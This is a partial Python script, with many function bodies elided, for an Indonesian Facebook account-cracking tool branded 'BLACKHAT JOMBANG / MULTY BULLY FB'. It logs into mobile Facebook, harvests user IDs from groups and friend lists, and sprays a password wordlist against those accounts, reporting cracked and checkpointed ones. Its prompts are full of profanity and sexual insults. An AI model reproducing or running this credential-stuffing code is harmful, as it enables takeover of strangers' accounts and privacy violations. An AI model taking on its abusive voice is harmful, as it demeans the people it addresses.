...
try:
	...
	tampil('\rm[!]SepertiNya anda goblok \rcmechanizenye\rm belum di install kontolll...')
	os.sys.exit()
def keluar():
	simpan()
	tampil('\rm[!]Get out')
	...
	while 1:
		...
		if v:
			if a.upper() in v:
				...
				tampil('\rm[!]Masukan Opsinya Kontol...')
				continue
		else:
			if len(a) == 0:
				tampil('\rm[!]Masukan yang benar kontol')
				continue
			else:
				break
	return a
def inputM(x,d):
	while 1:
		try:
			...
			tampil('\rm[!]Pilihan tidak ada,seperti hidup luu:v')
			continue
		if i in d:
			break
		else:
...
def simpan():
	if len(id_bgroup) != 0:
		tampil('\rh[*]Menyimpan hasil dari team luu')
		try:
			open(os.sys.path[0]+'/MBFbgroup.txt','w').write('\n'.join(id_bgroup))
			tampil('\rh[!]Berhasil save \rcMBFbgroup.txt')
		except:
			tampil('\rm[!]Gagal ngesave:v')
	if len(id_bteman) != 0:
		tampil('\rh[*]Menyimpan hasil daftar musuh luu...')
		try:
			open(os.sys.path[0]+'/MBFbteman.txt','w').write('\n'.join(id_bteman))
			tampil('\rh[!]Berhasil ngesave \rcMBFbgteman.txt')
		except:
			tampil('\rm[!]Gagal ngesave')
def buka(d):
	tampil('\rh[*]ahhhh...ahh.ahh...fuck...ahhh \rp'+d)
	try:
		x = br.open(d)
		br._factory.is_html = True
		x = x.read()
	except:
		tampil('\rm[!]Gagal crotz (karna bokepnya kurang hot) \rp'+d)
		keluar()
...
def login():
	global log
	us = inputD('[?]ID/No/Email luu:v')
	pa = inputD('[?]Kata Sandi')
	tampil('\rh[*]Sedang Masuk tunggu hingga crotz:v....')
	...
	if 'save-device' in url or 'm_sess' in url:
		tampil('\rh[*]Crotz...berhasil masukk.ahhhh')
		buka('https://mobile.facebook.com/home.php')
		nama = br.find_link(url_regex='logout.php').text
		nama = re.findall(r'\((.*a?)\)',nama)[0]
		tampil('\rh[*]Selamat datang teman anjing \rk%s\n\rh[*]Semoga ini adalah hari kehancuran....'%nama)
		log = 1
	elif 'checkpoint' in url:
		tampil('\rm[!]Akun kena tikung\n\rk[!]Coba ngesex dengan chrome')
		keluar()
	else:
		tampil('\rm[!]Gagal masukk.karna kontol luu peogk:v')
...
def saring_id_group0():
	global id_group
	while 1:
		id_group = inputD('[?]Id Team')
		tampil('\rh[*]Mengecek Team....')
		...
		try:
			...
			tampil('\rm[!]Id yang anda masukan benar.Tp boong:v')
			continue
	tampil('\rh[...]Mengambil Id dari Team \rc%s'%nama)
	saring_id_group1(a)
	return next
def idgroup():
	if log != 1:
		tampil('\rh[!]Register dulu.biar colinya lebihh ahh...')
		login()
		if log == 0:
			keluar()
	...
	while 1:
		...
		try:
			...
			tampil('\rm[!]Hanya Bisa ngesex sama nih bocahh \rh %d id'%len(id_bgroup))
			break
	simpan()
	i = inputD('[?]Langsung Coli/crot (y/t)',['Y','T'])
	if i.upper() == 'Y':
...
def idteman():
	...
	try:
		...
		if len(id_teman) != 0:
			tampil('\rm[!]Hanya Bisa ngesex sama nih bocahh \rp%d id'%len(id_bteman))
		else:
			tampil('\rm[!]Batal')
			keluar()
	while 1:
...
def crack(d):
	...
	if i.upper() == 'P':
		while 1:
			dir = inputD('[?]Masukan alamat bokep')
			try:
				...
				continue
			break
		tampil('\rh[*]Memulai coli dengan \rk%d password'%len(D))
		for i in D:
			i = i.replace('\n','')
			if len(i) != 0:
				crack0(d,i,0)
		i = inputD('[?]Tidak Puas colinya,Lanjutin aja sampai crot (y/t)',['Y','T'])
		if i.upper() == 'Y':
			return crack(d)
		else:
			return menu()
...
def crack0(data,sandi,p):
	tampil('\rh[*]Mengesex \rk%d Akun \rhdengan sandi \rm[\rk%s\rm]'%(len(data),sandi))
	...
	tampil('\rm[*]Jumlah akun berhasil.tp boong:v\rp         %d'%len(akun_gagal))
	tampil('\rk[*]Jumlah akun ke tikung\rp      %d'%len(akun_cekpoint))
	tampil('\rc[*]Jumlah akun jancokk\rp         %d'%len(akun_error))
	if p:
		i = inputD('[?]Tidak Puas colinya,Lanjutin aja sampai crot (y/t)',['Y','T'])
		if i.upper() == 'Y':
			return crack(data)
...
def lanjutT():
	global fid_bteman
	if len(fid_bteman) != 0:
		i = inputD('[?]Riset Hasil Id Musuh luu/lanjutkan colinya (r/l)',['R','L'])
		if i.upper() == 'L':
...
def menu():
	tampil('''\rb
    <====\rm000000  \rk0000    \rh000000\rb====>
   <=====\rm00      \rk00  0   \rh00  00\rb=====>
  <======\rm000000  \rk00   0  \rh00  00\rb======>
   <=====\rm00      \rk00  0   \rh00  00\rb=====>
    <====\rm000000  \rk0000    \rh000000\rb====>
<==========BLACKHAT JOMBANG===========>

\rm000000000000000000000000000000000000000
\rb0        \rb==>MULTY BULLY FB<==         \rb0
0 \rhDari Orang Gans\rp Edo ID              \rb0
0 \rhhttps://m.facebook.com/zerocyber.id \rb0
0 \rhhttps://github.com/edochuii         \rb0
0           \rkAlone To Free             \rb0
\rm000000000000000000000000000000000000000''')
	tampil('''\rk%s\n\rc1. \rhAmbil id dari team\n\rc2. \rhAmbil id dari daftar Musuh\n\rc3. \rmGet Out\n\rk%s'''%('?'*39,'?'*39))
